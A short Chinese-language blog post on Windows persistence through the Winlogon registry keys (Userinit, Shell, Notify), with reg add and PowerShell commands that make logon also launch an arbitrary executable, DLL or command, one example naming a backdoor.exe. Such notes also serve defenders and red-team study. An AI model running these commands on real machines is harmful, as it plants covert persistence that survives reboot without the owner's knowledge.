---
title: Persistence Winlogon Helper
date: 2023-09-13T17:15:29+08:00
draft: false
url: /posts/2023-09-13/Winlogon-Helper
tags:
  - Windows
  - Persistence
  - Winlogon-Helper
---

## 0x00 前言

Persistence Winlogon Helper

## 0x01 Winlogon Helper

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`的作用是指定用户登录时 Winlogon 运行的程序

默认情况下，Winlogon 运行 Userinit.exe（运行登录脚本），重新建立网络连接，然后启动 Windows 用户界面 Explorer.exe

可以更改此条目的值以添加或删除程序

```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit

# Usage
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, <path to executable>" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, <path to executable>" /f

# PowerShell 使用 Set-ItemProperty cmdlet 修改现有注册表项
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, <path to executable>" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, <path to executable>" -Force
```

`Notify `注册表项通常出现在较旧的操作系统（Windows 7 之前的操作系统）中，它指向处理 Winlogon 事件的通知包 DLL 文件

使用任意 DLL 替换此注册表下的DLLName将导致 Windows 在登录期间执行它

```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify

# Usage
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\cscdll" /v DLLName /d "<path to dll>" /f
```

## 0x02 利用方法

Userinit 键默认的值为`C:\Windows\system32\userinit.exe`，修改注册表项`Userinit`以包含任意负载将导致系统在 Windows 登录期间运行两个可执行文件

```cmd
# Usage
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\Windows\system32\userinit.exe,<path to executable>"

# 执行程序
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\Windows\system32\userinit.exe,C:\Users\admin\Documents\backdoor.exe"

# 执行命令
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\Windows\system32\userinit.exe,<command>"
```
